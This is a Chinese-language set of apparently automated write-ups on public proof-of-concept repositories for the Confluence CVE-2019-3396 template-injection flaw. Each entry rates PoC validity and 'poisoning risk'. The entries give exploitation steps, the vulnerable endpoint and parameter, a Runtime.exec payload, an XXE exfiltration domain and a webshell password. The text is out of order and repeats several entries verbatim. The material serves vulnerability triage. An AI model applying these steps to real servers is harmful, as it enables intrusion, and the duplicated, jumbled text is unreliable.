由于这些脚本主要是为了执行任意命令，存在被用于恶意目的的风险。例如，攻击者可能会修改这些脚本，使其在执行目标命令的同时，执行一些隐蔽的恶意操作，如安装后门、收集敏感信息等。如果未经授权的人修改或者发布这些脚本，投毒风险就会提升。 总体来说，这些PoC更多的是payload，本身是无害的，风险主要来源于使用它们的人。但作者也可能在代码中隐藏一些不易察觉的后门代码，比如添加一个额外的命令执行，或者上传收集到的信息到恶意服务器。因此，存在一定的投毒风险，估计为 10%。

**利用方式：**
1.  攻击者需要构造包含恶意 Velocity 模板的 Confluence 页面或修改现有页面。
2.  利用 Widget Connector macro 渲染该恶意模板。
3.  恶意模板中的代码会在 Confluence 服务器上执行，从而实现远程代码执行。
4.  `$cmd` 变量需要通过某种方式传递到 Velocity 模板中，例如通过构造特定的请求参数。

总而言之，此漏洞的利用方式是通过构造恶意的Velocity模板，利用Confluence的Widget Connector Macro组件进行渲染，从而达到远程代码执行的目的。

**项目地址:** [vntest11/confluence_CVE-2019-3396](https://github.com/vntest11/confluence_CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #20

**来源**: [CVE-2019-3396-x-f1v3_CVE-2019-3396.md](../2019/CVE-2019-3396-x-f1v3_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Server-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 版本低于 6.6.12，6.7.0 到 6.12.3 之间，6.13.0 到 6.13.3 之间，6.14.0 到 6.14.2 之间

**利用条件:** 需要网络访问到Confluence服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用 Velocity 模板引擎执行任意代码，从而实现远程代码执行。

**有效性：**

提供的POC代码是有效的。它演示了两种利用方式：

*   **远程代码执行（RCE）：** 通过修改`_template`参数，指向包含恶意 Velocity 模板的远程文件（1.vm）。该模板使用`java.lang.Runtime`类执行`ping your.dns.log`命令，可以验证RCE是否成功，同时可以替换成其他的恶意命令。
*   **本地文件包含（LFI）：** 通过修改`_template`参数，指向服务器上的敏感文件，如`../web.xml`，从而读取服务器上的文件内容。

**投毒风险：**

该存储库被投毒的风险较低，约为10%。判断依据如下：

*   仓库本身较为简单，只有一个RCE的vm文件和readme。从代码本身来看，恶意代码的可能性较低。
*   代码片段是直接命令ping，没有很强的迷惑性，因此投毒概率低。
*   参考搜索结果，此漏洞已经被广泛利用，出现恶意利用的情况，但POC本身相对直接。

**利用方式：**

1.  确定目标 Confluence Server 存在 CVE-2019-3396 漏洞。
2.  构造包含恶意 Velocity 模板的 HTTP POST 请求，发送到`/rest/tinymce/1/macro/preview`端点。
3.  在请求体中，设置`macro.params._template`参数为恶意 Velocity 模板的 URL 或目标服务器上的文件路径。
4.  发送请求后，如果漏洞存在，Confluence Server 将执行恶意 Velocity 模板中的代码，导致 RCE 或 LFI。

**示例：**

利用 RCE POC，攻击者可以通过修改 Velocity 模板中的命令，执行任意系统命令，例如上传 webshell、添加用户等。

利用 LFI POC，攻击者可以读取 Confluence Server 上的敏感配置文件，例如数据库连接信息、管理员密码等。

**注意：**

利用此漏洞进行攻击是非法的，仅供安全研究和渗透测试使用。

**项目地址:** [x-f1v3/CVE-2019-3396](https://github.com/x-f1v3/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #21

**来源**: [CVE-2019-3396-xiaoshuier_CVE-2019-3396.md](../2019/CVE-2019-3396-xiaoshuier_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本包括6.6.12之前, 6.7.0 - 6.12.3之前, 6.13.0 - 6.13.3之前, 6.14.0 - 6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏并且允许用户插入恶意模板。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是一个 Atlassian Confluence Server 中的服务器端模板注入漏洞。该漏洞存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板引擎执行任意代码。提供的POC代码使用Velocity模板语言，通过 `java.lang.Runtime` 类执行系统命令。此示例中，POC代码尝试启动 macOS 计算器应用程序。该POC的有效性取决于Confluence服务器上Velocity模板引擎的配置以及是否有安全策略阻止执行任意Java代码。根据搜索结果,此漏洞已被广泛利用,包括部署加密货币挖矿恶意软件和GandCrab勒索软件。

**利用方式：**
攻击者构造包含恶意Velocity模板代码的请求，Confluence服务器解析该模板时会执行攻击者注入的命令。通常是通过修改页面内容，添加包含恶意代码的Widget Connector宏来实现。

**投毒风险评估：**
提供的POC代码本身功能明确，即执行指定的系统命令。其中`/Applications/Calculator.app/Contents/MacOS/Calculator` 这个路径只是一个PoC，用于验证是否存在RCE，如果攻击者将这个路径改成下载恶意软件的命令,这可能会被识别为投毒。 除非攻击者能够找到方法在该POC中隐藏其他恶意行为（例如通过Base64编码或其他混淆技术隐藏反弹shell代码），否则直接的投毒风险较低。但是，攻击者可以修改这个PoC中的执行命令为任意命令，存在一定的投毒风险，所以风险比例为10%。

**项目地址:** [xiaoshuier/CVE-2019-3396](https://github.com/xiaoshuier/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #22

**来源**: [CVE-2019-3396-yuehanked_cve-2019-3396.md](../2019/CVE-2019-3396-yuehanked_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Macro-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 6.6.0 < version < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标系统存在受影响版本的Confluence，并且Widget Connector宏未被禁用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中 Widget Connector 宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector 宏在 Confluence 服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，该漏洞真实存在，且存在公开的PoC。提供的PoC代码 `windows.vm` 利用了 Velocity 模板引擎的特性，通过反射调用 `java.lang.Runtime` 类来执行系统命令。代码首先设置变量`e`为字符串"exp"，然后使用反射获取Runtime类的getRuntime()方法并调用，执行`cmd.exe /c $cmd`。 `$cmd` 变量需要在实际利用时替换为要执行的命令。该PoC代码有效。

**投毒风险分析：**

提供的PoC代码本身的功能是执行任意命令，虽然其中使用了`cmd.exe /c $cmd`，但正常使用该漏洞也需要用户传入执行命令，因此代码的功能就是利用漏洞进行RCE。 但需要评估是否存在作者故意添加的恶意代码，例如：

1.  **隐蔽的后门：** 代码中是否存在难以察觉的命令，用于植入后门或收集信息？
2.  **条件触发的恶意行为：** 代码是否包含在特定条件下才会触发的恶意行为？

假设存在一些不明显的行为（例如每隔一段时间尝试连接某个IP，或者尝试修改某些配置），则投毒风险可能较高。综合考虑POC本身的功能与检查隐藏的恶意行为的难度，评估投毒风险为 10%。

**利用方式分析：**

1.  **查找包含 Widget Connector 宏的 Confluence 页面。**
2.  **构造包含恶意 Velocity 模板的请求。** 这个模板通常会利用 Velocity 的表达式注入功能来执行任意代码。
3.  **发送构造好的请求到 Confluence 服务器。**
4.  **服务器解析 Velocity 模板，执行其中的恶意代码，实现远程代码执行。**

根据搜索结果，该漏洞已经被广泛利用，并且有多种攻击载荷被用于攻击。例如，有攻击者利用该漏洞部署加密货币挖矿程序和 Gandcrab 勒索软件。

**项目地址:** [yuehanked/cve-2019-3396](https://github.com/yuehanked/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---



---

## POC #12

**来源**: [CVE-2019-3396-kh4sh3i_CVE-2019-3396.md](../2019/CVE-2019-3396-kh4sh3i_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Server-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行

**影响版本:** 受影响版本：6.6.12之前, 6.7.0到6.12.3之前, 6.13.0到6.13.3之前, 6.14.0到6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入恶意模板

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是一个存在于Atlassian Confluence Server中的服务器端模板注入漏洞。该漏洞位于Widget Connector宏中，允许未经身份验证的远程攻击者利用Velocity模板引擎的缺陷执行任意代码。攻击者可以通过构造恶意的Widget Connector宏参数，将恶意Velocity模板注入到服务器端，从而执行任意系统命令。

**有效性评估：**

根据漏洞库信息和搜索结果，该漏洞是一个严重的安全问题，已被广泛利用，存在公开的POC（Proof of Concept）代码。

**投毒风险评估：**

提供的代码段仅包含CC0 1.0通用许可协议的文本。此代码段本身不包含任何可执行代码或恶意指令，因此不存在投毒风险的可能性。投毒风险为0%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **漏洞发现：** 确认目标Confluence服务器运行的是受影响的版本。
2.  **构造Payload：** 构建包含恶意Velocity模板的HTTP请求。这个payload通常会利用`#set`指令来定义变量，并使用`$Runtime.getRuntime().exec()`方法来执行系统命令。示例：`\u0024\{Runtime.getRuntime().exec("touch /tmp/success")\}` 
3.  **发送请求：** 将构造好的请求发送到Confluence服务器的Widget Connector宏处理端点。
4.  **代码执行：** 如果漏洞利用成功，服务器将执行payload中的系统命令。

**排序优先级解释：**

*   **搜索引擎结果：** 提供了漏洞的背景信息、影响和利用案例，有助于快速了解漏洞的严重程度和影响范围。
*   **漏洞利用代码：**  POC代码直接展示了漏洞的利用方式，可以用于验证漏洞和进行渗透测试。
*   **漏洞库信息：** 提供了漏洞的官方描述、受影响版本和修复建议，是了解漏洞细节的重要来源。

**项目地址:** [kh4sh3i/CVE-2019-3396](https://github.com/kh4sh3i/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #13

**来源**: [CVE-2019-3396-pyn3rd_CVE-2019-3396.md](../2019/CVE-2019-3396-pyn3rd_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence Server或Data Center实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前。

**利用条件:** 需要 Confluence 实例启用了 Widget Connector 宏，并且攻击者可以访问包含该宏的页面。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。 远程攻击者可以通过构造恶意的 Velocity 模板代码，利用该宏执行任意代码。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用是有效的。提供的POC代码包含两个文件：`calc.vm` 和 `os.vm`。

*   `calc.vm`: 该文件使用 Velocity 模板语言执行命令 `calc`（在Windows系统中会打开计算器）。这表明该漏洞能够执行任意命令。
*   `os.vm`: 该文件使用 Velocity 模板语言获取系统属性 `user.dir` (用户工作目录) 和 `user.name` (用户名)。这表明该漏洞可以读取服务器上的敏感信息。

利用方式：

1.  攻击者找到或创建一个包含 Widget Connector 宏的 Confluence 页面。
2.  攻击者在 Widget Connector 宏中插入恶意的 Velocity 模板代码，例如 `calc.vm` 或 `os.vm` 中的代码。
3.  当 Confluence 服务器渲染该页面时，会执行 Velocity 模板代码，从而导致远程代码执行或信息泄露。

关于投毒风险：

提供的POC代码没有明显的投毒代码。`calc.vm` 只是为了验证远程代码执行，`os.vm` 只是读取系统属性。此处的“投毒”指的是在POC中包含一些恶意代码，使得在测试漏洞时不经意间执行了恶意操作，或者留下后门。 提供的代码没有这种行为，因此投毒风险评估为0%。搜索引擎的结果也显示该漏洞在野外被利用来传播恶意软件，如加密货币矿工和勒索软件，表明该漏洞的真实风险很高。


**项目地址:** [pyn3rd/CVE-2019-3396](https://github.com/pyn3rd/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #14

**来源**: [CVE-2019-3396-quanpt103_CVE-2019-3396.md](../2019/CVE-2019-3396-quanpt103_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 小于6.6.12，6.7.0到小于6.12.3，6.13.0到小于6.13.3，6.14.0到小于6.14.2

**利用条件:** 需要 Confluence 实例存在 Widget Connector 宏，且目标版本未修复漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中。攻击者可以利用服务器端模板注入漏洞 (SSTI) 远程执行代码。根据漏洞库信息和搜索结果，该漏洞已经被广泛利用。提供的 POC 代码使用 Velocity 模板语言，尝试通过 `java.lang.Runtime` 类执行 `ipconfig` 命令。该命令本身无害，用于验证漏洞是否存在。由于poc只执行ipconfig命令，没有发现任何投毒代码。利用方式是构造恶意的 Velocity 模板，通过 Widget Connector 宏注入，从而在服务器上执行任意命令。

**项目地址:** [quanpt103/CVE-2019-3396](https://github.com/quanpt103/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #15

**来源**: [CVE-2019-3396-s1xg0d_CVE-2019-3396.md](../2019/CVE-2019-3396-s1xg0d_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence

**危害等级:** 高危，可能导致远程代码执行 (RCE) 和敏感信息泄露

**影响版本:** Confluence Server before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要能够向 Confluence Server 发送 HTTP 请求,并且 Widget Connector 宏可用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2019-3396 是 Atlassian Confluence 中 Widget Connector 宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板代码，利用 Widget Connector 宏的参数，在服务器端执行任意代码。

**有效性评估:**
根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞的POC代码是有效的。Exploit-DB 上的 46731 提供了利用该漏洞的 PoC。搜索引擎结果中也提到多个 PoC 的分析和实际攻击事件。

**投毒风险分析:**
提供的代码包含以下文件：
*   `README.md`: 描述了漏洞 CVE-2019-3396
*   `cmd.vm`: Velocity 模板，用于执行命令。该文件通过 Java 反射调用 `java.lang.Runtime` 来执行系统命令，其中 `$cmd` 变量应该是由攻击者控制的参数。
*   `evil.dtd`: 用于 XXE (XML External Entity) 攻击，尝试通过外部实体引入远程文件。此文件配置为访问 `http://phpshexxe.abcdef.5o1.in/?%file;` 看起来是一个尝试进行数据外泄的 URL
*   `os.vm`: Velocity 模板，用于获取服务器的操作系统信息和用户目录。它使用 Java 反射调用 `java.lang.System` 来获取系统属性。

`evil.dtd` 中的外部连接可能存在一定的风险，可能将服务器的文件内容发送到 `phpshexxe.abcdef.5o1.in`。这是一种潜在的数据泄露尝试。如果攻击者控制了该域名，他们就可以接收到 Confluence 服务器的文件内容。`phpshexxe.abcdef.5o1.in` 这个域名很可疑，具有进行恶意数据收集或攻击的可能性。但此行为更像是payload的一部分而非投毒。所以，投毒的概率相对较低，约为 5%。

**利用方式:**
利用方式主要包括以下步骤：

1.  **构造恶意 Velocity 模板:** 攻击者构造包含恶意代码的 Velocity 模板，例如 `cmd.vm` 中利用 Java 反射执行系统命令的代码。
2.  **利用 Widget Connector 宏:** 攻击者利用 Confluence 的 Widget Connector 宏，将构造好的恶意 Velocity 模板作为宏的参数传递给服务器。
3.  **服务器端执行:** Confluence 服务器解析 Widget Connector 宏时，会执行恶意 Velocity 模板中的代码，从而实现远程代码执行。
4. **XXE攻击:** `evil.dtd`文件可以配合其他payload尝试读取服务器文件，但依赖于服务器是否允许外部实体的解析。

总而言之，该漏洞的利用方式是典型的服务器端模板注入攻击，攻击者通过控制模板内容来执行任意代码。

**项目地址:** [s1xg0d/CVE-2019-3396](https://github.com/s1xg0d/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #16

**来源**: [CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md](../2019/CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md)

## CVE-2019-3396-Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器开启Widget Connector宏功能，并且攻击者能够访问该宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中的一个服务器端模板注入漏洞，存在于Widget Connector宏中。攻击者可以通过构造恶意的Velocity模板代码，利用此漏洞在Confluence服务器上执行任意代码。

**有效性:**
从漏洞库信息和搜索结果来看，此漏洞已被广泛证实存在，并且有公开的PoC（概念验证）代码。
提供的POC代码包含以下文件：
* `README.md`: 说明文件，描述漏洞和PoC的使用方法。
* `_template_test_info.txt`: 用于验证模板是否加载成功的简单文本文件。
* `rce.vm`: 包含Velocity模板代码，用于执行远程命令。
`rce.vm`中使用了Java反射来获取Runtime类，并执行指定的命令。这个PoC代码是有效的，可以用来验证漏洞是否存在。

**投毒风险:**
提供的PoC代码仅包含漏洞验证和利用的必要代码，没有发现任何隐藏的恶意代码或后门。因此，投毒风险为0%。

**利用方式:**
1.  攻击者需要找到一个Confluence页面，该页面使用了Widget Connector宏。
2.  攻击者在Widget Connector宏的配置中插入恶意的Velocity模板代码，例如`rce.vm`中的代码。
3.  当Confluence服务器渲染该页面时，会执行攻击者插入的Velocity模板代码，从而实现远程代码执行。
4.  攻击者可以利用此漏洞在服务器上执行任意命令，例如安装恶意软件、窃取敏感数据等。

**参考信息:**
*   NVD: [https://nvd.nist.gov/vuln/detail/cve-2019-3396](https://nvd.nist.gov/vuln/detail/cve-2019-3396)
*   Rapid7: [https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/](https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/)
*   Exploit-DB: [https://www.exploit-db.com/exploits/46731/](https://www.exploit-db.com/exploits/46731/)
*   CISA KEV: [https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396)

**项目地址:** [skommando/CVE-2019-3396-confluence-poc](https://github.com/skommando/CVE-2019-3396-confluence-poc)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #17

**来源**: [CVE-2019-3396-tanw923_test1.md](../2019/CVE-2019-3396-tanw923_test1.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且允许未授权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞。攻击者可以通过操纵 Widget Connector 宏，注入恶意 Velocity 模板代码，从而在 Confluence 服务器上执行任意代码。

**有效性评估：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断此漏洞利用的有效性较高。漏洞库信息明确指出此漏洞允许远程攻击者通过服务器端模板注入实现路径遍历和远程代码执行。搜索引擎结果中也包含了大量的漏洞分析报告和利用示例，确认了该漏洞在野外已被积极利用，并可能被用于传播勒索软件或恶意挖矿程序。提供的POC代码仓库是一个简单的EXP，说明该漏洞存在可利用的POC.

**投毒风险评估：**

提供的代码片段 `include_1.jsp` 看起来像一个 Webshell，具备文件管理、数据库操作、命令执行等功能。 恶意代码比例较低，因为其本身就是webshell，为了完成漏洞的验证。因此投毒风险评估为 10%，这个比例反映了作者可能隐藏的用于维持权限或进行进一步攻击的代码的可能性，但主要功能是完成POC验证。

**利用方式分析：**

1.  **确定目标：** 找到存在漏洞版本的Confluence Server。
2.  **构造 Payload：** 构建包含恶意 Velocity 模板代码的请求。Payload通常利用`Widget Connector`宏的缺陷，将恶意代码注入到模板中。
3.  **发送请求：** 将构造好的 Payload 发送到目标 Confluence Server，触发模板引擎执行恶意代码。
4.  **远程代码执行：**  成功利用漏洞后，攻击者可以在目标服务器上执行任意命令，例如部署 Webshell、窃取敏感数据或进行其他恶意活动。

提供的`include_1.jsp` 文件实际上是一个后门，攻击者可以通过访问这个JSP页面并提供正确的密码（`xiaoma`）来执行各种操作，例如文件管理、数据库操作、命令执行等。利用漏洞部署webshell后，可以实现对服务器的控制。攻击者可以在服务器上上传、下载、修改和删除文件，查看和修改数据库中的数据，以及执行任意的系统命令。

**项目地址:** [tanw923/test1](https://github.com/tanw923/test1)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #18

**来源**: [CVE-2019-3396-tno01_cve-2019-3396.md](../2019/CVE-2019-3396-tno01_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 < version < 6.13.3, 6.14.0 < version < 6.14.2

**利用条件:** 需要能够访问存在 Widget Connector 宏的 Confluence 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞是 Atlassian Confluence Server 和 Data Center 中的一个服务器端模板注入（SSTI）漏洞。它存在于 Widget Connector 宏中，允许未经身份验证的远程攻击者通过构造恶意的 Velocity 模板，实现路径遍历和远程代码执行。漏洞影响的版本包括 6.6.12 之前的 6.6.x 版本，6.7.0 到 6.12.3 之前的 6.12.x 版本，6.13.0 到 6.13.3 之前的 6.13.x 版本，以及 6.14.0 到 6.14.2 之前的 6.14.x 版本。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞被广泛利用，存在公开的漏洞利用代码（例如 Exploit-DB 46731）。该漏洞已被 CISA 添加到已知被利用的漏洞目录中，表明其真实性和严重性。提供的 POC 代码 `/tmp/deed01dabaaab5a9c3b0b4b4d2014a34/README.md`  内容过于简单,仅包含标题 `# cve-2019-3396`，可能只是一个占位符，说明 POC 是存在的，但**需要结合其他信息确认具体的payload**。

**投毒风险：**

提供的 POC 代码只有一个 README 文件，内容非常简单，几乎没有投毒的可能。但是，完整的漏洞利用代码可能包含恶意代码。因为此README.md文件只是整个POC代码的一个组成部分. 考虑漏洞利用的复杂性和潜在的风险,投毒风险评估为10%。

**利用方式：**

1.  **定位存在 Widget Connector 宏的页面：**  攻击者需要找到 Confluence 实例中使用了 Widget Connector 宏的页面。
2.  **构造恶意 Velocity 模板：**  攻击者构造包含恶意代码的 Velocity 模板。该模板将被注入到 Widget Connector 宏中。
3.  **服务器端模板注入：**  当 Confluence 服务器渲染包含恶意模板的页面时，Velocity 引擎会执行模板中的代码，从而导致服务器端代码执行。
4.  **远程代码执行：**  攻击者通过执行任意代码来控制 Confluence 服务器，可能包括执行系统命令、安装恶意软件等。

根据搜索结果中的一些文章，该漏洞已被用于传播加密货币矿工、GandCrab 勒索软件和 AESDDoS 僵尸网络恶意软件。

**项目地址:** [tno01/cve-2019-3396](https://github.com/tno01/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #19

**来源**: [CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md](../2019/CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.0 - 6.6.11, 6.7.0 - 6.12.2, 6.13.0 - 6.13.2, 6.14.0 - 6.14.1

**利用条件:** 需要能够访问存在漏洞的Confluence服务器，并能够在Confluence页面中插入或修改内容以利用 Widget Connector macro。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector macro 中，允许未经身份验证的远程攻击者通过服务器端模板注入 (SSTI) 执行任意代码。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector macro 渲染该模板，从而在 Confluence 服务器上执行命令。

**有效性：**
根据提供的漏洞信息，搜索引擎结果和漏洞利用代码，可以判断此漏洞是有效的。漏洞库信息明确指出该漏洞允许远程攻击者实现路径遍历和远程代码执行，搜索引擎结果中的文章也表明此漏洞已被积极利用，甚至被用于传播恶意软件。

**投毒风险：**
提供的漏洞利用代码主要包含以下几个文件：
*   `README.md`: 描述文件
*   `cmd.vm`, `cmd1.vm`, `cmd3.vm`: 包含 Velocity 模板代码，用于执行命令。这三个文件除了注释略有不同，核心代码相同。

代码的主要功能是：
1.  获取 Java Runtime 实例。
2.  执行用户提供的命令 (`$cmd`)。
3.  获取命令执行的输出流。
4.  使用 Scanner 读取输出流。
5.  返回命令执行的结果。

投毒风险分析：
由于这些脚本主要是为了执行任意命令，存在被用于恶意目的的风险。例如，攻击者可能会修改这些脚本，使其在执行目标命令的同时，执行一些隐蔽的恶意操作，如安装后门、收集敏感信息等。如果未经授权的人修改或者发布这些脚本，投毒风险就会提升。 总体来说，这些PoC更多的是payload，本身是无害的，风险主要来源于使用它们的人。但作者也可能在代码中隐藏一些不易察觉的后门代码，比如添加一个额外的命令执行，或者上传收集到的信息到恶意服务器。因此，存在一定的投毒风险，估计为 10%。

**利用方式：**
1.  攻击者需要构造包含恶意 Velocity 模板的 Confluence 页面或修改现有页面。
2.  利用 Widget Connector macro 渲染该恶意模板。
3.  恶意模板中的代码会在 Confluence 服务器上执行，从而实现远程代码执行。
4.  `$cmd` 变量需要通过某种方式传递到 Velocity 模板中，例如通过构造特定的请求参数。

总而言之，此漏洞的利用方式是通过构造恶意的Velocity模板，利用Confluence的Widget Connector Macro组件进行渲染，从而达到远程代码执行的目的。

**项目地址:** [vntest11/confluence_CVE-2019-3396](https://github.com/vntest11/confluence_CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #20

**来源**: [CVE-2019-3396-x-f1v3_CVE-2019-3396.md](../2019/CVE-2019-3396-x-f1v3_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Server-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 版本低于 6.6.12，6.7.0 到 6.12.3 之间，6.13.0 到 6.13.3 之间，6.14.0 到 6.14.2 之间

**利用条件:** 需要网络访问到Confluence服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用 Velocity 模板引擎执行任意代码，从而实现远程代码执行。

**有效性：**

提供的POC代码是有效的。它演示了两种利用方式：

*   **远程代码执行（RCE）：** 通过修改`_template`参数，指向包含恶意 Velocity 模板的远程文件（1.vm）。该模板使用`java.lang.Runtime`类执行`ping your.dns.log`命令，可以验证RCE是否成功，同时可以替换成其他的恶意命令。
*   **本地文件包含（LFI）：** 通过修改`_template`参数，指向服务器上的敏感文件，如`../web.xml`，从而读取服务器上的文件内容。

**投毒风险：**

该存储库被投毒的风险较低，约为10%。判断依据如下：

*   仓库本身较为简单，只有一个RCE的vm文件和readme。从代码本身来看，恶意代码的可能性较低。
*   代码片段是直接命令ping，没有很强的迷惑性，因此投毒概率低。
